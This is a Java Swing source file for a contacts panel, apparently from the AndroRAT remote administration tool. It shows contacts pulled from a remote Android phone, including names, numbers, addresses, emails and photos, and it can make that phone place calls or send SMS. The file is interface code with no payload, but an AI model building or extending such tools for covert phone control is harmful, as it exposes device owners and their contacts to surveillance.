package gui.panel;

import gui.AdvContactGUI;
import gui.UserGUI;

import javax.swing.DefaultListCellRenderer;
import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JScrollPane;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ListCellRenderer;
import javax.swing.SwingConstants;
import javax.swing.UIManager;
import javax.swing.border.TitledBorder;
import javax.swing.JButton;
import javax.swing.JList;

import java.awt.Color;
import java.awt.Component;
import java.awt.FlowLayout;
import java.awt.Image;
import java.awt.Toolkit;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import javax.swing.JLabel;
import javax.swing.JTextArea;

import utils.Contact;

import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Vector;

import javax.swing.JSplitPane;

public class ContactPanel extends JPanel {

	private JList list;
	private JLabel lblValId;
	private JLabel lblValname;
	private JLabel lblValnumber;
	private JTextArea txtrValaddr;
	private JLabel lblValemail;

	private JButton btnCall;
	private JButton btnSms;
	private JButton btnMoreInformations;

	private UserGUI gui;
	private HashMap<Integer, Contact> contactMap;
	private JSplitPane splitPane;

	/**
	 * Create the panel.
	 */
	public ContactPanel(UserGUI gui) {
		this.gui = gui;

		splitPane = new JSplitPane();
		splitPane.setResizeWeight(1.0);
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(
				Alignment.LEADING).addGroup(
				groupLayout
						.createSequentialGroup()
						.addContainerGap()
						.addComponent(splitPane, GroupLayout.DEFAULT_SIZE, 552,
								Short.MAX_VALUE).addContainerGap()));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(
				Alignment.LEADING).addGroup(
				groupLayout
						.createSequentialGroup()
						.addContainerGap()
						.addComponent(splitPane, GroupLayout.DEFAULT_SIZE, 452,
								Short.MAX_VALUE).addGap(10)));

		JScrollPane scrollPane = new JScrollPane();
		splitPane.setLeftComponent(scrollPane);

		list = new JList();
		list.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				contactListMouseClicked();
			}
		});
		scrollPane.setViewportView(list);

		JPanel panel_2 = new JPanel();
		splitPane.setRightComponent(panel_2);

		JPanel panel = new JPanel();
		panel.setBorder(new TitledBorder(null, "Informations",
				TitledBorder.LEADING, TitledBorder.TOP, null, null));

		btnCall = new JButton("Call");
		btnCall.setEnabled(false);
		btnCall.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				fireButtonCall();
			}
		});

		btnSms = new JButton("SMS");
		btnSms.setEnabled(false);
		btnSms.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				fireButtonSMS();
			}
		});

		btnMoreInformations = new JButton("More informations");
		btnMoreInformations.setEnabled(false);
		btnMoreInformations.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				fireButtonMoreInfo();
			}
		});

		JLabel lblId = new JLabel("Id :");

		lblValId = new JLabel("n/a");

		JLabel lblName = new JLabel("Name :");

		lblValname = new JLabel("n/a");

		JLabel lblNumber = new JLabel("Number :");

		lblValnumber = new JLabel("n/a");

		JLabel lblAddress = new JLabel("Address :");

		txtrValaddr = new JTextArea();
		txtrValaddr.setText("n/a");

		JLabel lblEmail = new JLabel("Email :");

		lblValemail = new JLabel("n/a");
		GroupLayout gl_panel = new GroupLayout(panel);
		gl_panel.setHorizontalGroup(gl_panel
				.createParallelGroup(Alignment.LEADING)
				.addGroup(
						gl_panel.createSequentialGroup()
								.addContainerGap()
								.addGroup(
										gl_panel.createParallelGroup(
												Alignment.LEADING)
												.addComponent(
														txtrValaddr,
														GroupLayout.DEFAULT_SIZE,
														197, Short.MAX_VALUE)
												.addComponent(
														btnMoreInformations,
														GroupLayout.DEFAULT_SIZE,
														197, Short.MAX_VALUE)
												.addGroup(
														gl_panel.createSequentialGroup()
																.addComponent(
																		btnCall,
																		GroupLayout.DEFAULT_SIZE,
																		95,
																		Short.MAX_VALUE)
																.addPreferredGap(
																		ComponentPlacement.RELATED)
																.addComponent(
																		btnSms,
																		GroupLayout.DEFAULT_SIZE,
																		96,
																		Short.MAX_VALUE))
												.addGroup(
														gl_panel.createSequentialGroup()
																.addGroup(
																		gl_panel.createParallelGroup(
																				Alignment.LEADING)
																				.addComponent(
																						lblId)
																				.addComponent(
																						lblName)
																				.addComponent(
																						lblNumber)
																				.addComponent(
																						lblAddress))
																.addPreferredGap(
																		ComponentPlacement.UNRELATED)
																.addGroup(
																		gl_panel.createParallelGroup(
																				Alignment.LEADING)
																				.addComponent(
																						lblValnumber)
																				.addComponent(
																						lblValname)
																				.addComponent(
																						lblValId)))
												.addGroup(
														gl_panel.createSequentialGroup()
																.addComponent(
																		lblEmail)
																.addPreferredGap(
																		ComponentPlacement.UNRELATED)
																.addComponent(
																		lblValemail)))
								.addContainerGap()));
		gl_panel.setVerticalGroup(gl_panel.createParallelGroup(
				Alignment.TRAILING)
				.addGroup(
						gl_panel.createSequentialGroup()
								.addContainerGap()
								.addGroup(
										gl_panel.createParallelGroup(
												Alignment.BASELINE)
												.addComponent(lblId)
												.addComponent(lblValId))
								.addPreferredGap(ComponentPlacement.UNRELATED)
								.addGroup(
										gl_panel.createParallelGroup(
												Alignment.BASELINE)
												.addComponent(lblName)
												.addComponent(lblValname))
								.addPreferredGap(ComponentPlacement.UNRELATED)
								.addGroup(
										gl_panel.createParallelGroup(
												Alignment.BASELINE)
												.addComponent(lblNumber)
												.addComponent(lblValnumber))
								.addPreferredGap(ComponentPlacement.UNRELATED)
								.addComponent(lblAddress)
								.addPreferredGap(ComponentPlacement.RELATED)
								.addComponent(txtrValaddr,
										GroupLayout.PREFERRED_SIZE, 42,
										GroupLayout.PREFERRED_SIZE)
								.addPreferredGap(ComponentPlacement.UNRELATED)
								.addGroup(
										gl_panel.createParallelGroup(
												Alignment.BASELINE)
												.addComponent(lblEmail)
												.addComponent(lblValemail))
								.addPreferredGap(ComponentPlacement.RELATED,
										191, Short.MAX_VALUE)
								.addComponent(btnMoreInformations)
								.addPreferredGap(ComponentPlacement.RELATED)
								.addGroup(
										gl_panel.createParallelGroup(
												Alignment.BASELINE)
												.addComponent(btnCall)
												.addComponent(btnSms))
								.addContainerGap()));
		panel.setLayout(gl_panel);

		JPanel panel_1 = new JPanel();
		panel_1.setBorder(new TitledBorder(null, "General options",
				TitledBorder.LEADING, TitledBorder.TOP, null, null));

		JButton btnRefreshList = new JButton("Refresh list");
		btnRefreshList.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				fireRefreshList();
			}
		});
		panel_1.add(btnRefreshList);
		GroupLayout gl_panel_2 = new GroupLayout(panel_2);
		gl_panel_2.setHorizontalGroup(gl_panel_2.createParallelGroup(
				Alignment.TRAILING).addGroup(
				gl_panel_2
						.createSequentialGroup()
						.addContainerGap()
						.addGroup(
								gl_panel_2
										.createParallelGroup(Alignment.LEADING)
										.addComponent(panel,
												GroupLayout.DEFAULT_SIZE, 219,
												Short.MAX_VALUE)
										.addComponent(panel_1,
												Alignment.TRAILING,
												GroupLayout.DEFAULT_SIZE, 219,
												Short.MAX_VALUE))
						.addContainerGap()));
		gl_panel_2.setVerticalGroup(gl_panel_2.createParallelGroup(
				Alignment.TRAILING).addGroup(
				gl_panel_2
						.createSequentialGroup()
						.addContainerGap()
						.addComponent(panel, GroupLayout.DEFAULT_SIZE, 365,
								Short.MAX_VALUE)
						.addPreferredGap(ComponentPlacement.RELATED)
						.addComponent(panel_1, GroupLayout.PREFERRED_SIZE,
								GroupLayout.DEFAULT_SIZE,
								GroupLayout.PREFERRED_SIZE).addContainerGap()));
		panel_2.setLayout(gl_panel_2);
		setLayout(groupLayout);
	}

	private void contactListMouseClicked() {
		int selected = list.getSelectedIndex();
		Contact contact = contactMap.get(selected);
		if (contact != null) {
			lblValId.setText(String.valueOf(contact.getId()));
			if (contact.getDisplay_name() != null)
				lblValname.setText(contact.getDisplay_name());
			if (contact.getPhones() != null)
				lblValnumber.setText(contact.getPhones().get(0));
			if (contact.getEmails() != null)
				lblValemail.setText(contact.getEmails().get(0));

			String txtAddr = "";
			if (contact.getStreet() != null)
				txtAddr += contact.getStreet() + "\n";
			if (contact.getCity() != null)
				txtAddr += contact.getCity() + "\n";
			if (contact.getRegion() != null)
				txtAddr += contact.getRegion() + " ";
			if (contact.getCountry() != null)
				txtAddr += contact.getCountry();
			txtrValaddr.setText(txtAddr);

			btnCall.setEnabled(true);
			btnMoreInformations.setEnabled(true);
			btnSms.setEnabled(true);
		} else {
			lblValId.setText("n/a");
			lblValname.setText("n/a");
			lblValnumber.setText("n/a");
			lblValemail.setText("n/a");
			txtrValaddr.setText("n/a");

			btnCall.setEnabled(false);
			btnMoreInformations.setEnabled(false);
			btnSms.setEnabled(false);
		}
	}

	private void fireRefreshList() {
		gui.fireGetContacts();
	}

	private void fireButtonCall() {
		if (!lblValnumber.getText().equals("n/a"))
			gui.fireGiveCall(lblValnumber.getText());
	}

	private void fireButtonSMS() {
		String txt = JOptionPane.showInputDialog(this, "Enter your text :");
		if (!lblValnumber.getText().equals("n/a"))
			gui.fireSendSMS(lblValnumber.getText(), txt);
	}

	private void fireButtonMoreInfo() {
		int selected = list.getSelectedIndex();
		Contact contact = contactMap.get(selected);
		new AdvContactGUI(contact);
	}

	/*
	public void updateContactList(ArrayList<Contact> contacts) {
		contactMap = new HashMap<Integer, Contact>();
		String[] values = new String[contacts.size()];
		int ptr = 0;
		for (Contact contact : contacts) {
			if (contact.getDisplay_name() != null) {
				contactMap.put(ptr, contact);
				if (contact.getPhones() == null) {
					values[ptr] = "no phone - " + contact.getDisplay_name() + " (id:" + contact.getId() + ")";
				}
				else{
					values[ptr] = contact.getPhones().get(0) + " - "+ contact.getDisplay_name() + " (id:"+ contact.getId() + ")";
					
					JLabel lbl = new JLabel(contact.getPhones().get(0) + " - "+ contact.getDisplay_name() + " (id:"+ contact.getId() + ")");
					lbl.setIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource("/gui/res/androrat_logo_32pix.png"))));
				}
				ptr++;
			}
		}

		list.setListData(values);
	}*/
	
	public void updateContactList(ArrayList<Contact> contacts)
	{
		contactMap = new HashMap<Integer, Contact>();
		String[] values = new String[contacts.size()];
		int ptr = 0;
		list.setCellRenderer(new ImageListCellRenderer());
		
		Object[] panels = new Object[contacts.size()];
		
		for (Contact contact : contacts)
		{
			if (contact.getDisplay_name() != null) 
			{
				contactMap.put(ptr, contact);
				byte[] im = contact.getPhoto();
				ImageIcon imgResize;
				if(im == null) {
					ImageIcon getImg = new ImageIcon(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource("/gui/res/People.png")));
					Image img = getImg.getImage();
					Image newimg = img.getScaledInstance(64, 64,  java.awt.Image.SCALE_SMOOTH);  
					imgResize = new ImageIcon(newimg);  
				}
				else {
					ImageIcon getImg = new ImageIcon(contact.getPhoto());
					Image img = getImg.getImage();
					Image newimg = img.getScaledInstance(64, 64,  java.awt.Image.SCALE_SMOOTH);  
					imgResize = new ImageIcon(newimg); 
				}

				
				if (contact.getPhones() == null) 
				{ 
					JLabel imgLabel = new JLabel("no phone - " + contact.getDisplay_name() + " (id:" + contact.getId() + ")", imgResize, SwingConstants.LEFT);
					JPanel imgPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
					imgPanel.add(imgLabel);
					
					panels[ptr] = imgPanel;
				}
				else
				{  				
					JLabel imgLabel = new JLabel(contact.getPhones().get(0) + " - "+ contact.getDisplay_name() + " (id:"+ contact.getId() + ")", imgResize, SwingConstants.LEFT);
					JPanel imgPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
					imgPanel.add(imgLabel);
					
					panels[ptr] = imgPanel;
				}
				ptr++;
			}
		}
		
		list.setListData(panels);
		
	}
	

	class ImageListCellRenderer implements ListCellRenderer
	{
		/**
		 * From http://java.sun.com/javase/6/docs/api/javax/swing/ListCellRenderer.html:
		 * 
		 * Return a component that has been configured to display the specified value. That component's paint method is then called to "render"
		 * the cell. If it is necessary to compute the dimensions of a list because the list cells do not have a fixed size, this method is
		 * called to generate a component on which getPreferredSize can be invoked.
		 * 
		 * jlist - the jlist we're painting value - the value returned by list.getModel().getElementAt(index). cellIndex - the cell index
		 * isSelected - true if the specified cell is currently selected cellHasFocus - true if the cell has focus
		 */
		@Override
		public Component getListCellRendererComponent(JList jlist, Object value, int cellIndex, boolean isSelected, boolean cellHasFocus)
		{
			if (value instanceof JPanel)
			{
				Component component = (Component) value;
				
				component.setForeground(Color.white);
				component.setBackground(isSelected ? Color.lightGray : Color.white);
				return component;
			} else
			{
				// TODO - I get one String here when the JList is first rendered; proper way to deal with this?
				// System.out.println("Got something besides a JPanel: " + value.getClass().getCanonicalName());
				return new JLabel("???");
			}
		}

	}
	
}
